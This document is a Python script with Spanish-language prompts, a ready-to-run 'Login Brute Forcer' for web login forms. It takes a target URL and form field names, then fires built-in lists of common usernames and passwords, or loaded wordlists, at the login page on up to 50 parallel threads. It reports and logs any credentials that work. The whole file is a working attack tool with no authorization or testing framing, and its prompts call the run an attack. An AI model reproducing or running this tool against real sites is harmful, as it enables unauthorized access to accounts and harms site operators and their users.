import requests
from datetime import datetime
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# ===== COLORES =====
V = "\033[92m"
A = "\033[93m"
R = "\033[91m"
C = "\033[96m"
B = "\033[1m"
N = "\033[0m"

def banner():
    print(f"{C}{B}╔{'═'*48}╗")
    print(f"║{' '*12}Login Brute Forcer{' '*12}║")
    print(f"╚{'═'*48}╝{N}\n")

def cargar_archivo(ruta):
    """Carga un archivo de usuarios o contraseñas"""
    if os.path.exists(ruta):
        with open(ruta, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    return []

def generar_usuarios():
    """Genera lista de usuarios comunes"""
    return [
        "admin", "administrator", "root", "user", "guest",
        "test", "demo", "manager", "staff", "support",
        "info", "sales", "office", "webmaster", "postmaster",
        "john", "mike", "david", "alex", "sarah",
        "emma", "olivia", "james", "robert", "michael",
        "admin1", "admin123", "superadmin", "sysadmin", "moderator",
    ]

def generar_passwords():
    """Genera lista de contraseñas comunes"""
    return [
        "admin", "password", "123456", "12345678", "qwerty",
        "123456789", "12345", "1234", "111111", "1234567",
        "sunshine", "iloveyou", "princess", "admin123", "welcome",
        "gato", "perro", "casa", "coche", "España",
        "gato123", "perro123", "casa123", "admin2024", "password123",
        "root", "toor", "adminadmin", "letmein", "monkey",
        "dragon", "master", "123123", "qwerty123", "1q2w3e4r",
        "football", "baseball", "starwars", "naruto", "batman",
        "superman", "ironman", "pokemon", "harrypotter", "lakers",
        "charlie", "thomas", "andrew", "joshua", "michael",
        "pass", "123", "abc", "test", "demo",
        "Password", "PASSWORD", "Admin", "ADMIN", "Root",
        "p@ssword", "p@ssw0rd", "admin!", "admin@123", "admin#123",
        "welcome1", "welcome123", "letmein1", "letmein123",
        "changeme", "secret", "private", "hidden", "locked",
        "qwerty123", "qwerty1234", "qwerty12345",
        "1q2w3e4r", "1q2w3e4r5t", "1q2w3e4r5t6y",
        "zxcvbnm", "asdfghjkl", "qazwsxedc",
    ]

def probar_login(url, usuario, password, headers, campos, exito_frase, fracaso_frase, metodo, encontrados, f, stats, lock):
    """Prueba una combinación usuario:password"""
    import threading
    
    data = {campos['user']: usuario, campos['pass']: password}
    
    try:
        if metodo == "POST":
            r = requests.post(url, data=data, headers=headers, timeout=5, allow_redirects=False)
        else:
            params = {campos['user']: usuario, campos['pass']: password}
            r = requests.get(url, params=params, headers=headers, timeout=5, allow_redirects=False)
        
        with lock:
            stats['intentos'] += 1
        
        # Detectar éxito
        if exito_frase and exito_frase.lower() in r.text.lower():
            with lock:
                if not encontrados:
                    print(f"\n  {V}{B}¡CREDENCIALES ENCONTRADAS!{N}")
                    print(f"  {V}Usuario: {usuario}{N}")
                    print(f"  {V}Contraseña: {password}{N}")
                    print(f"  {V}Intentos: {stats['intentos']}{N}\n")
                    f.write(f"\n[ENCONTRADO] Usuario: {usuario} | Contraseña: {password}\n")
                    f.write(f"Intentos: {stats['intentos']}\n")
                    encontrados.append((usuario, password))
        
        # Detectar fracaso (para descartar rápido)
        if fracaso_frase and fracaso_frase.lower() not in r.text.lower():
            with lock:
                if not encontrados:
                    print(f"\n  {V}{B}¡CREDENCIALES ENCONTRADAS!{N}")
                    print(f"  {V}Usuario: {usuario}{N}")
                    print(f"  {V}Contraseña: {password}{N}")
                    print(f"  {V}Intentos: {stats['intentos']}{N}\n")
                    f.write(f"\n[ENCONTRADO] Usuario: {usuario} | Contraseña: {password}\n")
                    f.write(f"Intentos: {stats['intentos']}\n")
                    encontrados.append((usuario, password))
        
        # Si no hay frase de éxito, detectamos por cambio de comportamiento
        if not exito_frase and not fracaso_frase:
            if r.status_code in [301, 302]:
                with lock:
                    if not encontrados:
                        print(f"\n  {V}{B}¡POSIBLE REDIRECCIÓN!{N}")
                        print(f"  {V}Usuario: {usuario}{N}")
                        print(f"  {V}Contraseña: {password}{N}")
                        print(f"  {V}Redirige a: {r.headers.get('Location', '?')}{N}\n")
                        f.write(f"\n[POSIBLE] Usuario: {usuario} | Contraseña: {password} | Redirect: {r.headers.get('Location', '?')}\n")
                        encontrados.append((usuario, password))
        
    except:
        pass

def barra_progreso(actual, total, velocidad, inicio):
    """Muestra barra de progreso"""
    porcentaje = (actual / total) * 100
    barra_len = 40
    lleno = int(barra_len * actual / total)
    vacio = barra_len - lleno
    tiempo_trans = time.time() - inicio
    if tiempo_trans > 0:
        vel = actual / tiempo_trans
        eta = (total - actual) / vel if vel > 0 else 0
    else:
        vel = 0
        eta = 0
    
    print(f"\r  [{V}{'█'*lleno}{'░'*vacio}{N}] {porcentaje:.1f}% | {actual}/{total} | {vel:.0f} p/s | ETA: {eta:.0f}s", end="", flush=True)

def main():
    banner()
    
    url = input(f"{B}URL del login:{N} ").strip()
    if not url.startswith("http"):
        url = "http://" + url
    
    print(f"\n{B}[*] Método:{N}")
    print(f"    1. POST")
    print(f"    2. GET")
    metodo_op = input(f"    Elige (1-2, Enter=1): ").strip() or "1"
    metodo = "POST" if metodo_op == "1" else "GET"
    
    print(f"\n{B}[*] Campos del formulario:{N}")
    campo_user = input(f"    Nombre del campo usuario (Enter=username): ").strip() or "username"
    campo_pass = input(f"    Nombre del campo contraseña (Enter=password): ").strip() or "password"
    
    campos = {'user': campo_user, 'pass': campo_pass}
    
    print(f"\n{B}[*] Frase de éxito:{N}")
    print(f"    (Palabra que aparece cuando el login es correcto)")
    exito = input(f"    Frase (Enter para omitir): ").strip()
    
    print(f"\n{B}[*] Frase de fracaso:{N}")
    print(f"    (Palabra que aparece cuando el login falla)")
    fracaso = input(f"    Frase (Enter para omitir): ").strip()
    
    print(f"\n{B}[*] Usuarios:{N}")
    print(f"    1. Lista integrada (25 usuarios)")
    print(f"    2. Cargar archivo .txt")
    print(f"    3. Un solo usuario")
    user_op = input(f"    Elige (1-3, Enter=1): ").strip() or "1"
    
    if user_op == "2":
        ruta_usuarios = input("    Ruta del archivo: ").strip()
        usuarios = cargar_archivo(ruta_usuarios)
        if not usuarios:
            print(f"    {A}Archivo no encontrado. Usando lista integrada.{N}")
            usuarios = generar_usuarios()
    elif user_op == "3":
        usuarios = [input("    Usuario: ").strip()]
    else:
        usuarios = generar_usuarios()
    
    print(f"\n{B}[*] Contraseñas:{N}")
    print(f"    1. Lista integrada (100 contraseñas)")
    print(f"    2. Cargar archivo .txt")
    pass_op = input(f"    Elige (1-2, Enter=1): ").strip() or "1"
    
    if pass_op == "2":
        ruta_pass = input("    Ruta del archivo: ").strip()
        passwords = cargar_archivo(ruta_pass)
        if not passwords:
            print(f"    {A}Archivo no encontrado. Usando lista integrada.{N}")
            passwords = generar_passwords()
    else:
        passwords = generar_passwords()
    
    print(f"\n{B}[*] Velocidad:{N}")
    print(f"    1. Lento (1 p/s)")
    print(f"    2. Normal (5 p/s)")
    print(f"    3. Rápido (10 p/s)")
    print(f"    4. Turbo (20 p/s)")
    print(f"    5. Máximo (50 p/s)")
    print(f"    6. Personalizado")
    vel_op = input(f"    Elige (1-6, Enter=3): ").strip() or "3"
    
    velocidades = {"1": 1, "2": 5, "3": 10, "4": 20, "5": 50}
    hilos = velocidades.get(vel_op, 10)
    if vel_op == "6":
        hilos = int(input("    Hilos: ").strip())
    
    total = len(usuarios) * len(passwords)
    
    print(f"\n{C}{'='*50}{N}")
    print(f"{C}   RESUMEN DEL ATAQUE{N}")
    print(f"{C}{'='*50}{N}")
    print(f"  URL: {url}")
    print(f"  Método: {metodo}")
    print(f"  Usuarios: {len(usuarios)}")
    print(f"  Contraseñas: {len(passwords)}")
    print(f"  Combinaciones: {total}")
    print(f"  Hilos: {hilos}")
    print(f"  Tiempo estimado: {total//hilos//2} segundos")
    print(f"{C}{'='*50}{N}\n")
    
    input(f"{B}Presiona Enter para ATACAR...{N}")
    
    encontrados = []
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    nombre_archivo = f"login_brute_{url.replace('://', '_').replace('/', '_')[:30]}_{ts}.txt"
    headers = {"User-Agent": "LoginBruteForcer/1.0"}
    
    import threading
    lock = threading.Lock()
    stats = {'intentos': 0}
    inicio = time.time()
    
    print(f"\n{B}[*] Atacando...{N}\n")
    
    with open(nombre_archivo, "w") as f:
        f.write(f"Login Brute Forcer\n")
        f.write(f"Objetivo: {url}\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Usuarios: {len(usuarios)} | Contraseñas: {len(passwords)}\n")
        f.write(f"{'='*50}\n\n")
        
        with ThreadPoolExecutor(max_workers=hilos) as executor:
            futures = []
            for usuario in usuarios:
                if encontrados:
                    break
                for password in passwords:
                    if encontrados:
                        break
                    futures.append(executor.submit(
                        probar_login, url, usuario, password, headers,
                        campos, exito, fracaso, metodo,
                        encontrados, f, stats, lock
                    ))
            
            # Monitorizar progreso
            while any(f.running() for f in futures):
                barra_progreso(stats['intentos'], total, hilos, inicio)
                time.sleep(0.5)
        
        f.write(f"\n{'='*50}\n")
        f.write(f"Combinaciones probadas: {stats['intentos']}\n")
    
    tiempo_total = time.time() - inicio
    print(f"\n\n{C}{B}{'='*50}{N}")
    print(f"{C}{B}   RESULTADOS{N}")
    print(f"{C}{'='*50}{N}")
    print(f"  Credenciales encontradas: {V}{len(encontrados)}{N}")
    print(f"  Tiempo: {tiempo_total:.1f} segundos")
    print(f"  Velocidad: {stats['intentos']/tiempo_total:.0f} p/s")
    print(f"  Archivo: {nombre_archivo}")
    print(f"{C}{'='*50}{N}\n")
    
    if encontrados:
        for i, (u, p) in enumerate(encontrados, 1):
            print(f"  {V}{i}. {u}:{p}{N}")
    else:
        print(f"  {R}No se encontraron credenciales.{N}")
    
    os.system("pause")

if __name__ == "__main__":
    main()
